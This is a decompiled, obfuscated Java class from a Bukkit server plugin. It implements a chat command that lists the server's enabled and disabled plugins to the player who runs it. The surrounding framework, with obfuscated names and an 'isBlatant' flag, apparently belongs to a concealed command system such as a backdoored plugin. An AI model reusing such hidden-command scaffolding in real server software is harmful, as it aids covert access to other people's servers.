/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class PluginsCommand
extends Command {
    public PluginsCommand() {
        PluginsCommand lllllllllllllIlIlIIllIlIIlIlIlII;
    }

    @Override
    public void execute(Core lllllllllllllIlIlIIllIlIIlIIlllI, String lllllllllllllIlIlIIllIlIIlIIllIl, String[] lllllllllllllIlIlIIllIlIIlIIllII, Player lllllllllllllIlIlIIllIlIIlIIlIll) {
        StringBuilder lllllllllllllIlIlIIllIlIIlIIlIlI = new StringBuilder();
        for (int lllllllllllllIlIlIIllIlIIlIlIIII = 0; lllllllllllllIlIlIIllIlIIlIlIIII < Bukkit.getPluginManager().getPlugins().length; ++lllllllllllllIlIlIIllIlIIlIlIIII) {
            if (Bukkit.getPluginManager().getPlugins()[lllllllllllllIlIlIIllIlIIlIlIIII].isEnabled()) {
                lllllllllllllIlIlIIllIlIIlIIlIlI.append(Settings.WHITE).append(Bukkit.getPluginManager().getPlugins()[lllllllllllllIlIlIIllIlIIlIlIIII].getName()).append(", ");
                continue;
            }
            lllllllllllllIlIlIIllIlIIlIIlIlI.append(Settings.RED).append(Bukkit.getPluginManager().getPlugins()[lllllllllllllIlIlIIllIlIIlIlIIII].getName()).append(String.valueOf(new StringBuilder().append(Settings.WHITE).append(", ")));
        }
        lllllllllllllIlIlIIllIlIIlIIlIll.sendMessage(Settings.PREFIX(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append(Bukkit.getPluginManager().getPlugins().length).append("&8) ").append(Settings.WHITE).append(lllllllllllllIlIlIIllIlIIlIIlIlI.substring(2, lllllllllllllIlIlIIllIlIIlIIlIlI.length()))))));
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

